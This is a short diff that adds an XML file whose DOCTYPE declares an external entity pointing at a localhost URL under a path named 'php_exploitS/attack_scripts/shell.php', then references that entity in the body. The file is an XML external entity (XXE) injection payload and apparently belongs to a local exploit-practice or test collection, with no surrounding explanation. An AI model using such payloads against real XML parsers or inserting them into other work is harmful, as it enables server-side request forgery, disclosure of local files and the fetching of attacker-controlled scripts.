@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE name[
+<!ENTITY name SYSTEM 'http://127.0.0.1:7070/php_exploitS/attack_scripts/shell.php'>]>
+<root>
+  <myname>&name;</myname>
+	</root>
